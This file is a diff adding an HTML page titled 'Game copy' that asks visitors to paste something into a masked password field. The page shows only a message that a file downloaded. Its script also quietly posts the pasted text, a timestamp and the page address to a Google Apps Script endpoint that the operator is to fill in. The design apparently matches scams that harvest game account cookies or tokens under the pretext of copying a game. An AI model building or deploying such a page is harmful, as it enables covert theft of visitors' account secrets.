@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="robots" content="noindex" />
+<title>Game copy</title>
+<style>
+  :root{
+    --blue:#3b7bff;
+    --bg:#04060c;
+    --text:#dfe8ff;
+  }
+  *{box-sizing:border-box;}
+  html,body{height:100%;}
+  body{
+    margin:0;
+    min-height:100%;
+    display:flex;align-items:center;justify-content:center;
+    padding:24px;
+    background:
+      radial-gradient(900px 520px at 50% -12%, rgba(59,123,255,.30), transparent 70%),
+      radial-gradient(700px 420px at 50% 115%, rgba(59,123,255,.16), transparent 70%),
+      var(--bg);
+    color:var(--text);
+    font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
+  }
+  .card{
+    width:100%;max-width:560px;
+    padding:38px 30px 30px;
+    text-align:center;
+    border:1px solid rgba(59,123,255,.35);
+    border-radius:22px;
+    background:linear-gradient(180deg,rgba(13,22,44,.94),rgba(5,9,20,.97));
+    box-shadow:
+      0 30px 80px -30px rgba(59,123,255,.6),
+      inset 0 1px 0 rgba(255,255,255,.05);
+  }
+  h1{
+    margin:0 0 8px;
+    font-size:clamp(28px,6vw,40px);
+    font-weight:800;
+    letter-spacing:-.02em;
+    background:linear-gradient(180deg,#fff,#8fb4ff 65%,#3b7bff);
+    -webkit-background-clip:text;background-clip:text;
+    color:transparent;
+  }
+  .sub{
+    margin:0 0 28px;
+    font-size:12px;letter-spacing:.18em;text-transform:uppercase;
+    color:#7f92bb;
+  }
+  input[type="password"]{
+    width:100%;
+    padding:18px;
+    font-size:16px;
+    letter-spacing:.35em;
+    color:#cfe0ff;
+    background:rgba(3,7,16,.9);
+    border:1px solid rgba(59,123,255,.28);
+    border-radius:14px;
+    outline:none;
+    transition:border-color .2s, box-shadow .2s;
+  }
+  input[type="password"]::placeholder{letter-spacing:0;color:#4c5c80;}
+  input[type="password"]:focus{
+    border-color:var(--blue);
+    box-shadow:0 0 0 4px rgba(59,123,255,.16),0 0 28px rgba(59,123,255,.35);
+  }
+  button{
+    width:100%;margin-top:16px;padding:16px;
+    font:700 15px/1 ui-sans-serif,system-ui,sans-serif;
+    letter-spacing:.08em;text-transform:uppercase;
+    color:#eaf1ff;cursor:pointer;
+    border:1px solid rgba(59,123,255,.55);
+    border-radius:14px;
+    background:linear-gradient(180deg,#2a5fe0,#1a3fa8);
+    box-shadow:0 14px 34px -14px rgba(59,123,255,.9),inset 0 1px 0 rgba(255,255,255,.25);
+    transition:filter .2s, transform .1s;
+  }
+  button:hover{filter:brightness(1.12);}
+  button:active{transform:translateY(1px);}
+  button:disabled{opacity:.55;cursor:default;}
+  .status{margin:14px 0 0;min-height:18px;font-size:12.5px;color:#6f83ad;}
+  .toast{
+    position:fixed;left:50%;bottom:26px;
+    transform:translate(-50%,160%);
+    opacity:0;pointer-events:none;
+    padding:12px 20px;border-radius:12px;
+    font-size:14px;color:#dce8ff;
+    background:rgba(9,16,34,.96);
+    border:1px solid rgba(59,123,255,.5);
+    box-shadow:0 0 26px rgba(59,123,255,.35);
+    transition:transform .35s cubic-bezier(.2,.9,.3,1.25), opacity .3s;
+    z-index:50;max-width:90vw;
+  }
+  .toast.show{transform:translate(-50%,0);opacity:1;}
+  .shake{animation:shake .35s;}
+  @keyframes shake{
+    0%,100%{transform:translateX(0);}
+    25%{transform:translateX(-7px);}
+    75%{transform:translateX(7px);}
+  }
+</style>
+</head>
+<body>
+  <main class="card">
+    <h1>Game copy</h1>
+    <p class="sub">Paste · Enter · Download</p>
+
+    <input id="secret" type="password" placeholder="Paste here…"
+           autocomplete="off" spellcheck="false" />
+    <button id="send" type="button">Send</button>
+    <p class="status" id="status"></p>
+  </main>
+
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<script>
+(function () {
+  // 1) Paste your Google Apps Script Web App URL here (see instructions below)
+  const ENDPOINT = "PASTE_YOUR_APPS_SCRIPT_URL_HERE";
+
+  const input   = document.getElementById('secret');
+  const btn     = document.getElementById('send');
+  const status  = document.getElementById('status');
+  const toastEl = document.getElementById('toast');
+
+  let toastTimer;
+  function toast(msg){
+    toastEl.textContent = msg;
+    toastEl.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => toastEl.classList.remove('show'), 2800);
+  }
+
+  function stamp(){
+    const d = new Date(), p = n => String(n).padStart(2,'0');
+    return `${d.getFullYear()}${p(d.getMonth()+1)}${p(d.getDate())}-${p(d.getHours())}${p(d.getMinutes())}${p(d.getSeconds())}`;
+  }
+
+  // Builds a .txt file in the browser and auto-downloads it
+  function downloadTxt(text){
+    const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement('a');
+    a.href = url;
+    a.download = `gamecopy-${stamp()}.txt`;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    setTimeout(() => URL.revokeObjectURL(url), 3000);
+  }
+
+  // Sends the text to your Google Apps Script endpoint
+  function sendToDrive(text){
+    if (!ENDPOINT || ENDPOINT.indexOf('PASTE_YOUR') === 0) {
+      return Promise.resolve('skipped');
+    }
+    return fetch(ENDPOINT, {
+      method: 'POST',
+      mode: 'no-cors',                                   // Apps Script has no CORS headers
+      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+      body: JSON.stringify({
+        text: text,
+        time: new Date().toISOString(),
+        page: location.href
+      })
+    }).then(() => 'sent').catch(() => 'failed');
+  }
+
+  async function handleSend(){
+    const raw = input.value;
+
+    if (!raw.trim()){
+      toast('Nothing to copy — paste something first');
+      input.classList.add('shake');
+      setTimeout(() => input.classList.remove('shake'), 400);
+      input.focus();
+      return;
+    }
+
+    btn.disabled = true;
+    status.textContent = '';
+
+    downloadTxt(raw);                 // auto-download
+    toast('✅ File downloaded');      // tell the user it downloaded
+
+    input.value = '';
+    input.focus();
+
+    const result = await sendToDrive(raw);
+    if (result === 'sent')        status.textContent = 'Saved ✓';
+    else if (result === 'failed') status.textContent = 'Saved locally (upload failed)';
+    else                          status.textContent = 'Saved locally (no endpoint set)';
+
+    btn.disabled = false;
+  }
+
+  btn.addEventListener('click', handleSend);
+  input.addEventListener('keydown', e => {
+    if (e.key === 'Enter'){ e.preventDefault(); handleSend(); }
+  });
+})();
+</script>
+</body>
+</html>
